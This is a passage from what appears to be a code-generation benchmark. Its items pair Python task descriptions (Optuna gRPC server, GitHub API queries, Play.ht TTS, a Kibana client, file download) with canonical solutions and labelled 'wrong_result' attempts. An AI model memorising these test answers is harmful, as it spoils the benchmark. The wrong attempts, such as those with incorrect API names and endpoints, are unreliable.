api_pb2.CreateNewTrialReply(trial_id=trial_id)\n\n    def SetTrialParameter(self, request: api_pb2.SetTrialParameterRequest, context: grpc.ServicerContext) -> api_pb2.SetTrialParameterReply:\n        trial_id = request.trial_id\n        param_name = request.param_name\n        param_value_internal = request.param_value_internal\n        distribution = json_to_distribution(request.distribution)\n        try:\n            self._backend.set_trial_param(trial_id, param_name, param_value_internal, distribution)\n        except KeyError as e:\n            context.abort(code=grpc.StatusCode.NOT_FOUND, details=str(e))\n        except RuntimeError as e:\n            context.abort(code=grpc.StatusCode.FAILED_PRECONDITION, details=str(e))\n        except ValueError as e:\n            context.abort(code=grpc.StatusCode.INVALID_ARGUMENT, details=str(e))\n        return api_pb2.SetTrialParameterReply()\n\n    def GetTrial(self, request: api_pb2.GetTrialRequest, context: grpc.ServicerContext) -> api_pb2.GetTrialReply:\n        trial_id = request.trial_id\n        try:\n            trial = self._backend.get_trial(trial_id)\n        except KeyError as e:\n            context.abort(code=grpc.StatusCode.NOT_FOUND, details=str(e))\n        return api_pb2.GetTrialReply(trial=_to_proto_trial(trial))\n\n    def GetAllTrials(self, request: api_pb2.GetAllTrialsRequest, context: grpc.ServicerContext) -> api_pb2.GetAllTrialsReply:\n        study_id = request.study_id\n        states = [_from_proto_trial_state(state) for state in request.states]\n        try:\n            trials = self._backend.get_all_trials(\n                study_id,\n                deepcopy=False,\n                states=states,\n            )\n        except KeyError as e:\n            context.abort(code=grpc.StatusCode.NOT_FOUND, details=str(e))\n        return api_pb2.GetAllTrialsReply(trials=[_to_proto_trial(trial) for trial in trials])\n\n@experimental_func(\"4.2.0\")\ndef run_grpc_proxy_server(\n    storage: BaseStorage,\n    *,\n    host: str = \"localhost\",\n    port: int = 13000,\n    thread_pool: ThreadPoolExecutor | None = None,\n) -> None:\n    server = grpc.server(thread_pool or ThreadPoolExecutor(max_workers=10))\n    api_pb2_grpc.add_StorageServiceServicer_to_server(\n        OptunaStorageProxyService(storage), server\n    )\n    server.add_insecure_port(f\"{host}:{port}\")\n    server.start()\n    _logger.info(f\"Server started at {host}:{port}\")\n    _logger.info(\"Listening...\")\n    server.wait_for_termination()",
    "Code_level": "Class-level",
    "FSMID_for_test": 74,
    "wrong_result": "import grpc\nimport threading\nimport api_pb2\nimport api_pb2_grpc\nfrom optuna import BaseStorage\n\nclass OptunaStorageProxyService(api_pb2_grpc.StorageServiceServicer):\n    def __init__(self, backend: BaseStorage):\n        self._backend = backend\n        self._lock = threading.Lock()\n\n    def CreateNewStudy(self, request: api_pb2.CreateNewStudyRequest, context: grpc.ServicerContext) -> api_pb2.CreateNewStudyReply:\n        with self._lock:\n            study_id = self._backend.create_new_study(name=request.name, directions=request.directions)\n            return api_pb2.CreateNewStudyReply(study_id=study_id)\n\n    def DeleteStudy(self, request: api_pb2.DeleteStudyRequest, context: grpc.ServicerContext) -> api_pb2.DeleteStudyReply:\n        with self._lock:\n            self._backend.delete_study(study_id=request.study_id)\n            return api_pb2.DeleteStudyReply()\n\n    def SetStudyUserAttribute(self, request: api_pb2.SetStudyUserAttributeRequest, context: grpc.ServicerContext) -> api_pb2.SetStudyUserAttributeReply:\n        with self._lock:\n            self._backend.set_study_user_attribute(study_id=request.study_id, key=request.key, value=request.value)\n            return api_pb2.SetStudyUserAttributeReply()\n\n    def GetStudyIdFromName(self, request: api_pb2.GetStudyIdFromNameRequest, context: grpc.ServicerContext) -> api_pb2.GetStudyIdFromNameReply:\n        with self._lock:\n            study_id = self._backend.get_study_id_from_name(name=request.name)\n            return api_pb2.GetStudyIdFromNameReply(study_id=study_id)\n\n    def GetStudyNameFromId(self, request: api_pb2.GetStudyNameFromIdRequest, context: grpc.ServicerContext) -> api_pb2.GetStudyNameFromIdReply:\n        with self._lock:\n            study_name = self._backend.get_study_name_from_id(study_id=request.study_id)\n            return api_pb2.GetStudyNameFromIdReply(study_name=study_name)\n\n    def GetAllStudies(self, request: api_pb2.GetAllStudiesRequest, context: grpc.ServicerContext) -> api_pb2.GetAllStudiesReply:\n        with self._lock:\n            studies = self._backend.get_all_studies()\n            reply = api_pb2.GetAllStudiesReply()\n            for study in studies:\n                reply.studies.append(study)\n            return reply\n\n    def CreateNewTrial(self, request: api_pb2.CreateNewTrialRequest, context: grpc.ServicerContext) -> api_pb2.CreateNewTrialReply:\n        with self._lock:\n            trial_id = self._backend.create_new_trial(study_id=request.study_id)\n            return api_pb2.CreateNewTrialReply(trial_id=trial_id)\n\n    def SetTrialParameter(self, request: api_pb2.SetTrialParameterRequest, context: grpc.ServicerContext) -> api_pb2.SetTrialParameterReply:\n        with self._lock:\n            self._backend.set_trial_parameter(trial_id=request.trial_id, param_name=request.param_name, param_value=request.param_value)\n            return api_pb2.SetTrialParameterReply()\n\n    def GetTrial(self, request: api_pb2.GetTrialRequest, context: grpc.ServicerContext) -> api_pb2.GetTrialReply:\n        with self._lock:\n            trial = self._backend.get_trial(trial_id=request.trial_id)\n            reply = api_pb2.GetTrialReply()\n            reply.trial.CopyFrom(trial)\n            return reply\n\n    def GetAllTrials(self, request: api_pb2.GetAllTrialsRequest, context: grpc.ServicerContext) -> api_pb2.GetAllTrialsReply:\n        with self._lock:\n            trials = self._backend.get_all_trials(study_id=request.study_id, state=request.state)\n            reply = api_pb2.GetAllTrialsReply()\n            for trial in trials:\n                reply.trials.append(trial)\n            return reply"
  },
  {
    "Task_id": 5,
    "Instruction": "Task Description: Create a Python function that interacts with the Pithos music player via D-Bus to retrieve and format the currently playing song's artist and title.\n\nFunction Description: The function connects to the user's D-Bus session bus, accesses the Pithos music player service, retrieves the current song information, and returns it in a formatted string combining the artist and title.\n\nInput: None\n\nOutput: str - A string in the format \"Artist - Title\" representing the currently playing song in Pithos, or None if the operation fails.",
    "Canonical_solution": "import dbus\n\ndef get_pithos_current_song():\n    pithos_bus = dbus.SessionBus()\n    pithos = pithos_bus.get_object(\"net.kevinmehall.Pithos\", \"/net/kevinmehall/Pithos\")\n    props = pithos.get_dbus_method(\"GetCurrentSong\", \"net.kevinmehall.Pithos\")\n    return props()[\"artist\"] + \" - \" + props()[\"title\"]",
    "Code_level": "Function-level",
    "FSMID_for_test": 75,
    "wrong_result": "import dbus\nfrom dbus.exceptions import DBusException\n\ndef get_current_song():\n    try:\n        bus = dbus.SessionBus()\n        player_obj = bus.get_object('org.pithos.Player', '/org/pithos/Player')\n        interface = dbus.Interface(player_obj, 'org.pithos.Player')\n        current_song = interface.GetCurrentlyPlayingSong()\n        artist = current_song.get('artist')\n        title = current_song.get('title')\n        if artist and title:\n            return f\"{artist} - {title}\"\n        return None\n    except DBusException:\n        return None\n    except Exception:\n        return None"
  },
  {
    "Task_id": 54,
    "Instruction": "Task Description: Implement an asynchronous function to fetch and filter GitHub contributors for a repository, then retrieve their detailed user information.\n\nFunction Description: This function asynchronously retrieves contributors from a GitHub repository using the GitHub API, filters them based on specific criteria (user type, ignored logins, and acknowledgements), and then fetches detailed information for each qualifying contributor. The function uses httpx for asynchronous HTTP requests and handles pagination to retrieve all contributors.\n\nInput:\n- auth: Tuple[str, str] - A tuple containing GitHub username and password/token for authentication\n- GITHUB_API_CONTRIBUTORS: str - The GitHub API endpoint for contributors\n- PER_PAGE: int - Number of contributors to fetch per page\n- GITHUB_USER_TYPE: str - The type of contributor to filter for (e.g., 'User')\n- IGNORED_AUTHOR_LOGINS: List[str] - List of GitHub logins to ignore\n- ACKNOWLEDGEMENTS: str - String containing acknowledged contributors to exclude\n\nOutput:\n- List[Dict] - A list of dictionaries containing detailed user information for unacknowledged contributors who meet the filtering criteria",
    "Canonical_solution": "import asyncio\nimport httpx\n\nasync def main():\n    auth = (input(\"Github Username: \"), getpass())\n    async with httpx.AsyncClient() as client:\n        page = 0\n        results = []\n        contributors = []\n        while not page or len(results) == PER_PAGE:\n            page += 1\n            response = await client.get(\n                f\"{GITHUB_API_CONTRIBUTORS}?per_page={PER_PAGE}&page={page}\", auth=auth\n            )\n            results = response.json()\n            contributors.extend(\n                (\n                    contributor\n                    for contributor in results\n                    if contributor[\"type\"] == GITHUB_USER_TYPE\n                    and contributor[\"login\"] not in IGNORED_AUTHOR_LOGINS\n                    and f\"@{contributor['login'].lower()}\" not in ACKNOWLEDGEMENTS\n                )\n            )\n\n        unacknowledged_users = await asyncio.gather(\n            *(client.get(contributor[\"url\"], auth=auth) for contributor in contributors)\n        )\n        unacknowledged_users = [request.json() for request in unacknowledged_users]",
    "Code_level": "Function-level",
    "FSMID_for_test": 59,
    "wrong_result": "import httpx\n\nasync def fetch_contributors(auth, GITHUB_API_CONTRIBUTORS, PER_PAGE, GITHUB_USER_TYPE, IGNORED_AUTHOR_LOGINS, ACKNOWLEDGEMENTS):\n    client = httpx.AsyncClient(auth=auth)\n    acknowledged_logins = set(ACKNOWLEDGEMENTS.split()) if ACKNOWLEDGEMENTS else set()\n    all_contributors = []\n    page = 1\n    while True:\n        url = f\"{GITHUB_API_CONTRIBUTORS}?page={page}&per_page={PER_PAGE}\"\n        response = await client.get(url)\n        if response.status_code != 200:\n            break\n        data = response.json()\n        if not data:\n            break\n        for contrib in data:\n            if contrib['type'] != GITHUB_USER_TYPE:\n                continue\n            if contrib['login'] in IGNORED_AUTHOR_LOGINS:\n                continue\n            if contrib['login'] in acknowledged_logins:\n                continue\n            user_url = f\"https://api.github.com/users/{contrib['login']}\"\n            user_response = await client.get(user_url)\n            if user_response.status_code == 200:\n                all_contributors.append(user_response.json())\n        page += 1\n    return all_contributors"
  },
  {
    "Task_id": 55,
    "Instruction": "Task Description: Create an asynchronous function to check if the ngrok API is online and wait for it to become available if it's not.\n\nFunction Description: The function continuously attempts to connect to the ngrok API at a specified URL (constructed from environment variables) until it receives a successful response. It uses exponential backoff (fixed interval retries) between attempts and logs the connection status. The function is designed to be used in scenarios where you need to ensure the ngrok API is available before proceeding with operations that depend on it.\n\nInput: \n- None (uses environment variables NGROK_HOST and NGROK_PORT to construct the API URL)\n  \nOutput: \n- Returns True when the ngrok API is successfully reached\n- Does not return until a successful connection is established (infinite retry loop)",
    "Canonical_solution": "import asyncio\nimport httpx\nimport logging\n\nlogger = logging.getLogger(__name__)\n\nasync def wait_for_ngrok_api():\n    NGROK_API_URL = f\"http://{os.getenv('NGROK_HOST', 'ngrok')}:{os.getenv('NGROK_PORT', 4040)}\"\n    RETRY_INTERVAL = 15\n\n    while True:\n        try:\n            async with httpx.AsyncClient() as client:\n                response = await client.get(f\"{NGROK_API_URL}/api/tunnels\")\n                response.raise_for_status()\n                logger.debug(\"ngrok API is online.\")\n                return True\n        except httpx.RequestError:\n            logger.debug(\"ngrok API is offline. Waiting...\")\n            await asyncio.sleep(RETRY_INTERVAL)",
    "Code_level": "Function-level",
    "FSMID_for_test": 59,
    "wrong_result": "import os\nimport asyncio\nimport aiohttp\nimport logging\n\nlogging.basicConfig(level=logging.INFO)\n\nasync def check_ngrok_api():\n    url = f\"http://{os.getenv('NGROK_HOST')}:{os.getenv('NGROK_PORT')}\"\n    async with aiohttp.ClientSession() as session:\n        while True:\n            try:\n                async with session.get(url, timeout=5) as response:\n                    if response.status == 200:\n                        logging.info(\"Ngrok API is online.\")\n                        return True\n            except Exception as e:\n                logging.error(f\"Failed to connect to Ngrok API: {e}\")\n            await asyncio.sleep(5)"
  },
  {
    "Task_id": 58,
    "Instruction": "Task Description: Create a Python class that interacts with the Play.ht API to synthesize text into speech and return the audio as an AudioSegment object.\n\nClass Description: The PlayHtSynthesizer class provides functionality to convert text to speech using the Play.ht API. It handles API authentication, request construction, and response processing to return audio in a usable format.\n\nAttributes:\n- voice: str - The voice identifier to be used for speech synthesis\n- sample_rate: int - The audio sample rate (default: 24000)\n- speed: Optional[float] - The playback speed of the synthesized speech\n- preset: Optional[str] - The voice preset to use\n- api_key: Optional[str] - The API key for Play.ht authentication\n- user_id: Optional[str] - The user ID for Play.ht authentication\n- tts_endpoint: str - The API endpoint for text-to-speech synthesis (default: \"https://play.ht/api/v2/tts/stream\")\n\nMethods:\n- __init__(voice: str, sample_rate: int = 24000, speed: Optional[float] = None, preset: Optional[str] = None, api_key: Optional[str] = None, user_id: Optional[str] = None) -> None - Initializes the synthesizer with configuration parameters\n- synthesize(text: str) -> AudioSegment - Converts the input text to speech using the Play.ht API and returns the audio as an AudioSegment object",
    "Canonical_solution": "import io\nfrom typing import Optional\nimport requests\nfrom pydub import AudioSegment\n\nclass PlayHtSynthesizer:\n    def __init__(\n        self,\n        voice: str,\n        sample_rate: int = 24000,\n        speed: Optional[float] = None,\n        preset: Optional[str] = None,\n        api_key: Optional[str] = None,\n        user_id: Optional[str] = None,\n    ):\n        self.voice = voice\n        self.sample_rate = sample_rate\n        self.speed = speed\n        self.preset = preset\n        self.api_key = api_key\n        self.user_id = user_id\n        self.tts_endpoint = \"https://play.ht/api/v2/tts/stream\"\n\n    def synthesize(self, text: str) -> AudioSegment:\n        headers = {\n            \"Authorization\": f\"Bearer {self.api_key}\",\n            \"X-User-ID\": self.user_id,\n            \"Accept\": \"audio/mpeg\",\n            \"Content-Type\": \"application/json\",\n        }\n        body = {\n            \"voice\": self.voice,\n            \"text\": text,\n            \"sample_rate\": self.sample_rate,\n        }\n        if self.speed is not None:\n            body[\"speed\"] = self.speed\n        if self.preset is not None:\n            body[\"preset\"] = self.preset\n\n        response = requests.post(self.tts_endpoint, headers=headers, json=body, timeout=5)\n        if not response.ok:\n            raise Exception(f\"Play.ht API error: {response.status_code}, {response.text}\")\n\n        return AudioSegment.from_mp3(io.BytesIO(response.content))",
    "Code_level": "Class-level",
    "FSMID_for_test": 57,
    "wrong_result": "import requests\nfrom pydub import AudioSegment\nimport tempfile\nimport os\nfrom typing import Optional\n\nclass PlayHtSynthesizer:\n    def __init__(self, voice: str, sample_rate: int = 24000, speed: Optional[float] = None, preset: Optional[str] = None, api_key: Optional[str] = None, user_id: Optional[str] = None):\n        self.voice = voice\n        self.sample_rate = sample_rate\n        self.speed = speed\n        self.preset = preset\n        self.api_key = api_key\n        self.user_id = user_id\n        self.tts_endpoint = \"https://play.ht/api/v2/tts/stream\"\n\n    def synthesize(self, text: str) -> AudioSegment:\n        payload = {\n            'text': text,\n            'voice': self.voice,\n            'speed': self.speed,\n            'preset': self.preset\n        }\n        headers = {\n            'User-ID': self.user_id,\n            'API-Key': self.api_key\n        }\n        response = requests.post(self.tts_endpoint, json=payload, headers=headers, stream=True)\n        if response.status_code != 200:\n            raise Exception(f\"API request failed with status code {response.status_code}\")\n        with tempfile.NamedTemporaryFile(delete=False, suffix='.wav') as temp_file:\n            temp_file_path = temp_file.name\n        with open(temp_file_path, 'wb') as f:\n            for chunk in response.iter_content(chunk_size=1024):\n                if chunk:\n                    f.write(chunk)\n        audio = AudioSegment.from_wav(temp_file_path)\n        os.remove(temp_file_path)\n        return audio"
  },
  {
    "Task_id": 63,
    "Instruction": "Task Description: Create a function to download a file from a given URL and save it to a specified local folder.\n\nFunction Description: The function downloads a file from the provided URL using HTTP GET request and saves it to the specified folder. It handles folder creation if it doesn't exist and provides feedback on the download status.\n\nInput:\n- url: str - The URL of the file to download\n- folder_path: str - The local directory path where the file should be saved\n\nOutput:\n- None - The function doesn't return any value but saves the file to disk and prints status messages",
    "Canonical_solution": "import os\nimport requests\n\ndef download_file(url: str, folder_path: str) -> None:\n    # Create the folder if it doesn't exist\n    if not os.path.exists(folder_path):\n        os.makedirs(folder_path)\n\n    # Extract filename from URL\n    filename = url.split(\"/\")[-1]\n\n    # Define path to save the file\n    file_path = os.path.join(folder_path, filename)\n\n    # Send a GET request to the URL\n    response = requests.get(url)\n\n    # Check if request was successful (status code 200)\n    if response.status_code == 200:\n        # Save the file to the specified folder\n        with open(file_path, \"wb\") as f:\n            f.write(response.content)\n        print(f\"File downloaded successfully to {file_path}\")\n    else:\n        print(f\"Failed to download file. Status code: {response.status_code}\")",
    "Code_level": "Function-level",
    "FSMID_for_test": 57,
    "wrong_result": "import os\nimport requests\nfrom urllib.parse import urlsplit\n\ndef download_file(url, folder_path):\n    try:\n        os.makedirs(folder_path, exist_ok=True)\n    except Exception as e:\n        print(f\"Failed to create folder: {e}\")\n        return\n    parsed_url = urlsplit(url)\n    filename = os.path.basename(parsed_url.path)\n    if not filename:\n        filename = \"downloaded_file\"\n    file_path = os.path.join(folder_path, filename)\n    try:\n        response = requests.get(url, stream=True)\n        response.raise_for_status()\n        with open(file_path, 'wb') as f:\n            for chunk in response.iter_content(chunk_size=8192):\n                f.write(chunk)\n        print(f\"Download completed: {file_path}\")\n    except requests.exceptions.RequestException as e:\n        print(f\"Error downloading file: {e}\")\n    except Exception as e:\n        print(f\"An error occurred: {e}\")"
  },
  {
    "Task_id": 64,
    "Instruction": "Task Description: Create a Python class that serves as an HTTP client for interacting with Kibana and Elasticsearch APIs, handling authentication, requests, and responses for various operations.\n\nClass Description: The KibanaHTTPClient class provides methods to interact with Kibana's saved objects and Elasticsearch's templates through HTTP requests. It handles authentication, SSL verification, and response parsing.\n\nAttributes:\n- username: str - The username for authentication (default: \"redelk\")\n- password: str - The password for authentication (default: None)\n- verify_ssl: bool - Flag to enable/disable SSL verification (default: False)\n- scheme: str - The URL scheme (default: \"https\")\n- kibana_url: str - The base URL for Kibana API (default: \"https://localhost:5601\")\n- es_url: str - The base URL for Elasticsearch API (default: \"https://localhost:9200\")\n- headers: dict - HTTP headers including \"kbn-xsrf\" for Kibana requests\n\nMethods:\n- fetch_kibana_object(obj_type: str) -> list - Fetches Kibana saved objects of specified type by making a POST request to Kibana's export API. Returns parsed NDJSON response.\n- fetch_es_template(template_name: str) -> dict - Retrieves an Elasticsearch template by name via GET request. Returns parsed JSON response.\n- fetch_es_component_templates() -> dict - Gets all Elasticsearch component templates via GET request. Returns parsed JSON response.\n- fetch_es_index_templates() -> dict - Retrieves all Elasticsearch index templates via GET request. Returns parsed JSON response.",
    "Canonical_solution": "import requests\nimport json\nimport ndjson\nimport os\nimport re\n\nclass KibanaHTTPClient:\n    def __init__(self, username=\"redelk\", password=None, verify_ssl=False):\n        self.username = username\n        self.password = password\n        self.verify_ssl = verify_ssl\n        self.scheme = \"https\"\n        self.kibana_url = f\"{self.scheme}://localhost:5601\"\n        self.es_url = f\"{self.scheme}://localhost:9200\"\n        self.headers = {\"kbn-xsrf\": \"true\"}\n\n    def fetch_kibana_object(self, obj_type):\n        try:\n            response = requests.post(\n                f\"{self.kibana_url}/api/saved_objects/_export\",\n                json={\"type\": obj_type},\n                verify=self.verify_ssl,\n                auth=(self.username, self.password),\n                headers=self.headers,\n            )\n            if response.status_code != 200:\n                raise Exception(f\"HTTP status code {response.status_code}\")\n            return ndjson.loads(response.text.encode(\"utf-8\"))\n        except Exception as error:\n            raise Exception(f\"Error fetching kibana object {obj_type}: {error}\")\n\n    def fetch_es_template(self, template_name):\n        try:\n            response = requests.get(\n                f\"{self.es_url}/_template/{template_name}\",\n                verify=self.verify_ssl,\n                auth=(self.username, self.password),\n            )\n            if response.status_code != 200:\n                raise Exception(f\"HTTP status code {response.status_code}\")\n            return json.loads(response.text.encode(\"utf-8\"))\n        except Exception as error:\n            raise Exception(f\"Error fetching ES template {template_name}: {error}\")\n\n    def fetch_es_component_templates(self):\n        try:\n            response = requests.get(\n                f\"{self.es_url}/_component_template\",\n                verify=self.verify_ssl,\n                auth=(self.username, self.password),\n            )\n            if response.status_code != 200:\n                raise Exception(f\"HTTP status code {response.status_code}\")\n            return response.json()\n        except Exception as error:\n            raise Exception(f\"Error fetching ES component templates: {error}\")\n\n    def fetch_es_index_templates(self):\n        try:\n            response = requests.get(\n                f\"{self.es_url}/_index_template\",\n                verify=self.verify_ssl,\n                auth=(self.username, self.password),\n            )\n            if response.status_code != 200:\n                raise Exception(f\"HTTP status code {response.status_code}\")\n            return response.json()\n        except Exception as error:\n            raise Exception(f\"Error fetching ES index templates: {error}\")",
    "Code_level": "Class-level",
    "FSMID_for_test": 57,
    "wrong_result": "import requests\nimport json\n\nclass KibanaHTTPClient:\n    def __init__(self, username=\"redelk\", password=None, verify_ssl=False, scheme=\"https\", kibana_url=\"https://localhost:5601\", es_url=\"https://localhost:9200\", headers={\"kbn-xsrf\": \"true\"}):\n        self.username = username\n        self.password = password\n        self.verify_ssl = verify_ssl\n        self.scheme = scheme\n        self.kibana_url = kibana_url\n        self.es_url = es_url\n        self.headers = headers\n\n    def fetch_kibana_object(self, obj_type):\n        url = f\"{self.kibana_url}/api/saved_objects/_export?format=ndjson&type={obj_type}\"\n        response = requests.post(url, headers=self.headers, auth=(self.username, self.password), verify=self.verify_ssl)\n        data = []\n        for line in response.text.split('\\n'):\n            if line.strip():\n                data.append(json.loads(line))\n        return data\n\n    def fetch_es_template(self, template_name):\n        url = f\"{self.es_url}/_template/{template_name}\"\n        response = requests.get(url, headers=self.headers, verify=self.verify_ssl)\n        return response.json()\n\n    def fetch_es_component_templates(self):\n        url = f\"{self.es_url}/_component_template\"\n        response = requests.get(url, headers=self.headers, verify=self.verify_ssl)\n        return response.json()\n\n    def fetch_es_index_templates(self):\n        url = f\"{self.es_url}/_index_template\"\n        response = requests.get(url, headers=self.headers, verify=self.verify_ssl)\n        return response.json()"
  },
  {
    "Task_id": 65,
    "Instruction": "Task Description: Implement a function to perform web searches using Google's Custom Search JSON API, handling both regular web searches and image searches, with proper error handling and response processing.\n\nFunction Description: The function performs a web search using Google's Custom Search API, constructs the appropriate API request based on search type, processes the response, and returns formatted results. It handles API keys, pagination, and different search types (web/image).\n\nInput:\n- keywords: (str or list) - Search terms as either a string or list of strings\n- paper_num: (int, optional) - Page number for paginated results (default=1)\n\nOutput:\n- Returns either:\n  - A formatted string containing search results (snippets and URLs) with date information\n  - An error message if the request fails (either HTTP error or exception)\n  - A message suggesting to check next page if no results found\n\nThe function also prints debug information including status code and response body to stdout.",
    "Canonical_solution": "import json\nfrom datetime import date\nimport requests\nfrom ..config import config_path, load_api_keys\n\napi_keys = load_api_keys(config_path)\ng_api_key = api_keys.get(\"google_api_key\")\ng_CSE_ID = api_keys.get(\"CSE_ID\")\ng_searchType = \"web\"\n\ndef search_web(keywords, paper_num=1):\n    if paper_num == \"\":\n        paper_num = 1\n    today = str(date.today())\n    global g_api_key, g_CSE_ID, g_searchType\n    num_results = 10\n    start = num_results * (int(paper_num) - 1) + 1\n    try:\n        base_url = \"https://www.googleapis.com/customsearch/v1\"\n        if g_searchType == \"image\":\n            params = {\n                \"key\": g_api_key,\n                \"cx\": g_CSE_ID,\n                \"num\": num_results,\n                \"q\": keywords if isinstance(keywords, str) else \" \".join(keywords),\n                \"start\": start,\n                \"searchType\": g_searchType,\n            }\n        else:\n            params = {\n                \"key\": g_api_key,\n                \"cx\": g_CSE_ID,\n                \"num\": num_results,\n                \"q\": keywords if isinstance(keywords, str) else \" \".join(keywords),\n                \"start\": start,\n            }\n\n        response = requests.get(base_url, params=params, timeout=10)\n        print(\"Status code:\", response.status_code)\n        print(\"Response body:\", response.text)\n\n        data = response.json()\n        all_content = \"\"\n        if response.status_code == 200:\n            data = response.json()\n            if \"items\" in data:\n                for item in data[\"items\"]:\n                    keyword = item[\"snippet\"]\n                    url = item[\"link\"]\n                    all_content += \"/n/n\" + json.dumps({\"snippet\": keyword, \"link\": url}, ensure_ascii=False, indent=4)\n\n        else:\n            return f\"Error: {response.status_code} - {response.text}\"\n\n    except Exception as e:\n        return f\"Exception occurred: {e}\"\n\n    print(all_content)\n    return (\n        \"\u4eca\u5929\u7684\u65e5\u671f\u662f\"\n        + today\n        + \"\uff0c\u5f53\u524d\u7f51\u7edc\u7684\u4fe1\u606f\u548c\u4fe1\u606f\u6765\u6e90\u7684\u7f51\u5740\u4e3a\uff1a\u201c\"\n        + str(all_content)\n        + \"\u201d\u3002/n\u5982\u679c\u4ee5\u4e0a\u4fe1\u606f\u4e2d\u6ca1\u6709\u76f8\u5173\u4fe1\u606f\uff0c\u4f60\u53ef\u4ee5\u6539\u53d8paper_num\uff0c\u67e5\u770b\u4e0b\u4e00\u9875\u7684\u4fe1\u606f\u3002\"\n    )",
    "Code_level": "Function-level",
    "FSMID_for_test": 57,
    "wrong_result": "import os\nimport requests\nimport json\n\ndef google_search(keywords, paper_num=1, search_type='web'):\n    api_key = os.environ.get('GOOGLE_API_KEY')\n    search_engine_id = os.environ.get('GOOGLE_CSE_ID')\n    \n    if not api_key or not search_engine_id:\n        return \"Error: Missing API key or search engine ID.\"\n    \n    if isinstance(keywords, list):\n        query = ' '.join(keywords)\n    else:\n        query = keywords\n    \n    params = {\n        'q': query,\n        'cx': search_engine_id,\n        'key': api_key,\n        'num': 10,\n        'start': (paper_num - 1) * 10 + 1,\n        'type': search_type\n    }\n    \n    try:\n        response = requests.get('https://www.googleapis.com/customsearch/v1', params=params)\n        response.raise_for_status()\n    except requests.exceptions.RequestException as e:\n        print(f\"Error: {e}\")\n        return f\"Error: {e}\"\n    \n    try:\n        data = response.json()\n    except ValueError:\n        print(\"Error parsing JSON response.\")\n        return \"Error: Invalid JSON response from API.\"\n    \n    if not data.get('items'):\n        print(f\"No results found for page {paper_num}.\")\n        return \"No results found. Check next page.\"\n    \n    results = []\n    for item in data['items']:\n        snippet = item.get('snippet', '')\n        link = item.get('link', '')\n        date = item.get('publishedDate', '')\n        results.append((snippet, link, date))\n    \n    output = \"\"\n    for i, (snippet, link, date) in enumerate(results, 1):\n        output += f\"{i}. {snippet}\\nLink: {link}\\nDate: {date}\\n\\n\"\n    \n    print(f\"Status Code: {response.status_code}\")\n    print(\"Response Body:\")\n    print(json.dumps(data, indent=2))\n    \n    return output"
  },
  {
    "Task_id": 66,
    "Instruction": "Task Description: Retrieve information about a specific GitHub project using the GitHub GraphQL API.\n\nFunction Description: This function queries the GitHub GraphQL API to fetch project details (id, title, and number) for a given organization and project title. It authenticates using a GitHub token and returns the project information if found.\n\nInput:\n- github_token: [str] - GitHub personal access token for authentication\n- github_org: [str] - GitHub organization name\n- github_project: [str] - Title of the project to search for\n\nOutput:\n- [dict/None] - Returns a dictionary containing the project's id, title, and number if found, otherwise None. Raises an HTTPError if the request fails.",
    "Canonical_solution": "import requests\nimport os\nimport sys\nfrom datetime import datetime, timedelta\n\n\nGITHUB_GRAPHQL_URL = \"https://api.github.com/graphql\"\n\n\ndef get_github_project_info(github_token, github_org, github_project):\n    headers = {\n        \"Authorization\": f\"Bearer {github_token}\",\n        \"Content-Type\": \"application/json\"\n    }\n    query = '''\n    {\n      organization(login: \"%s\") {\n        projectsV2(first: 20) {\n          nodes {\n            id\n            title\n            number\n          }\n        }\n      }\n    }\n    ''' % (github_org)\n    payload = {\n        \"query\": query\n    }\n\n    response = requests.post(GITHUB_GRAPHQL_URL, headers=headers, json=payload)\n    if response.status_code == 200:\n        # fine project by title\n        nodes = response.json().get(\"data\").get(\"organization\").get(\"projectsV2\").get(\"nodes\")\n        for node in nodes:\n            if node.get(\"title\") == github_project:\n                return node\n    else:\n        response.raise_for_status()",
    "Code_level": "Function-level",
    "FSMID_for_test": 57,
    "wrong_result": "import requests\nimport json\n\ndef get_github_project(github_token, github_org, github_project):\n    query = '''\n        query ($org: String!, $title: String!) {\n            organization(login: $org) {\n                projects(title: $title, states: ALL) {\n                    nodes {\n                        id\n                        title\n                        number\n                    }\n                }\n            }\n        }\n    '''\n    variables = {\n        \"org\": github_org,\n        \"title\": github_project\n    }\n    headers = {\n        \"Authorization\": f\"Bearer {github_token}\",\n        \"Content-Type\": \"application/json\"\n    }\n    url = \"https://api.github.com/graphql\"\n    response = requests.post(url, json={'query': query, 'variables': variables}, headers=headers)\n    response.raise_for_status()\n    data = response.json()\n    projects = data.get('data', {}).get('organization', {}).get('projects', {}).get('nodes', [])\n    if not projects:\n        return None\n    return {'id': projects[0]['id'], 'title': projects[0]['title'], 'number': projects[0]['number']}"
  },
  {
    "Task_id": 67,
    "Instruction": "Task Description: Create a function to download financial market data from a specific API endpoint, handling authentication, progress tracking, and error checking during the download process.\n\nFunction Description: The function downloads compressed CSV data from a REST API endpoint for a given exchange, data type, symbol, and date. It streams the download to efficiently handle large files, shows progress using a progress bar, verifies the download completeness, and saves the data to a specified file path. The function includes proper error handling for failed requests or incomplete downloads.\n\nInput:\n- exchange: [str] - The financial exchange identifier (e.g., 'binance')\n- data_type: [str] - The type of market data to download (e.g., 'trades')\n- symbol: [str] - The trading symbol/pair (e.g., 'BTCUSDT')\n- yyyymmdd: [int/str] - The date in YYYYMMDD format\n- filepath: [str] - The local path where the downloaded file should be saved\n- key: [str] - The API authorization key (Bearer token)\n\nOutput:\n- None - The function doesn't return anything but saves the downloaded data to the specified file path\n- Raises RuntimeError if the download fails (either due to HTTP error or incomplete download)",
    "Canonical_solution": "import json\nimport os.path\nimport requests\nfrom datetime import datetime, timedelta\nfrom tqdm import tqdm\n\ndef download(exchange, data_type, symbol, yyyymmdd, filepath, key):\n    yyyymmdd = str(yyyymmdd)\n    url = f'https://datasets.tardis.dev/v1/{exchange}/{data_type}/{yyyymmdd[:4]}/{yyyymmdd[4:6]}/{yyyymmdd[6:]}/{symbol}.csv.gz'\n\n    response = requests.get(url, stream=True, headers={'Authorization': f'Bearer {key}'})\n    if response.status_code != 200:\n        raise RuntimeError('Could not download file')\n\n    total_size = int(response.headers.get('content-length', 0))\n    block_size = 1024\n\n    with tqdm(total=total_size, unit='B', unit_scale=True) as progress_bar:\n        with open(filepath, 'wb') as file:\n            for data in response.iter_content(block_size):\n                progress_bar.update(len(data))\n                file.write(data)\n\n    if total_size != 0 and progress_bar.n != total_size:\n        raise RuntimeError('Could not download file')",
    "Code_level": "Function-level",
    "FSMID_for_test": 57,
